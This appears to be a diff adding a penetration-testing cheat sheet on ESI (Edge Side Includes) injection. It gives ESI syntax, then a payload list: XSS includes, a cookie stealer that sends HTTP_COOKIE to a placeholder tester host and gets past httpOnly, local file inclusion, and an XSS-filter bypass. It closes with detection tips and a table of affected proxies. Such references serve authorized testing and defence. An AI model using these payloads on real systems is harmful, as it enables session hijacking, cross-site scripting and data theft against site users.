@@ -1,0 +1,89 @@
+ESI Features & Syntax
+---------------------
+
+-Variables
+
+<esi:vars>$(VARIABLE_NAME)</esi:vars>
+$(HTTP_USER_AGENT) → Mozilla/5.0 (X11;[…]
+$(QUERY_STRING) → city=Montreal&format=C
+$(HTTP_COOKIE) → _ga=[…]&__utma=[…]
+
+ex : <esi:vars>$(HTTP_COOKIE{PHPSESSID})</esi:vars>
+
+
+
+-Include
+
+//esi/page-1.html:
+<html>
+<p>This is page 1!</p>
+<esi:include src="//api/page-2.html" />
+</html>
+
+//api/page-2.html:
+//api/page-2.html:
+<p>This is page 2!</p>
+
+
+
+
+
+
+ESI payloads
+Code: html
+
+// Basic detection
+<esi: include src=http://<PENTESTER IP>>
+
+// XSS Exploitation Example
+<esi: include src=http://<PENTESTER IP>/<XSSPAYLOAD.html>>
+
+// Cookie Stealer (bypass httpOnly flag)
+<esi: include src=http://<PENTESTER IP>/?cookie_stealer.php?=$(HTTP_COOKIE)>
+
+// Introduce private local files (Not LFI per se)
+<esi:include src="supersecret.txt">
+
+// Valid for Akamai, sends debug information in the response
+<esi:debug/>
+
+//xss bypass
+x=<esi:assign name="var1" value="'cript'"/>
+<s  <esi:vars name="$(var1)"/>  >
+alert(/Chrome%20XSS%20filter%20bypass/);
+
+</s <esi:vars name="$(var1)"/>  >
+
+
+
+detection :
+
+
+
+
+-Although we can identify the use of ESI by inspecting response headers in search for Surrogate-Control: content="ESI/1.0"
+
+-we usually need to use a blind attack approach to detect if ESI is in use or not.
+
+-Specifically, we can introduce ESI tags to HTTP requests to see if any intermediary proxy is parsing the request and if ESI Injection is possible.
+ESI — Manual Detection (by Alex Birsan @alxbrsn)
+FOO<!--esi -->BAR → FOOBAR ✅
+FOO<!--foo -->BAR → FOO<!--foo -->BAR ❌
+
+
+
+
+Includes: Supports the <esi:includes> directive
+Vars: Supports the <esi:vars> directive. Useful for bypassing XSS Filters
+Cookie: Document cookies are accessible to the ESI engine
+Upstream Headers Required: Surrogate applications will not process ESI statements unless the upstream application provides the headers
+Host Allowlist: In this case, ESI includes are only possible from allowed server hosts, making SSRF, for example, only possible against those hosts
+
+
+Software                                 	Includes 	Vars 	Cookies 	Upstream Headers Required 	Host Whitelist
+Squid3 	                                       Yes 	    Yes 	   Yes 	           Yes 	                       No
+VarnishCache 	                               Yes 	    No 	       No              Yes                         Yes
+Fastly 	                                       Yes 	    No 	       No 	           No 	                       Yes
+Akamai ESI Test Server (ETS) 	               Yes 	    Yes 	   Yes 	           No 	                       No
+NodeJS esi 	                                   Yes 	    Yes 	   Yes 	           No 	                       No
+NodeJS nodesi 	                               Yes 	    No 	       No 	           No 	                       Optional
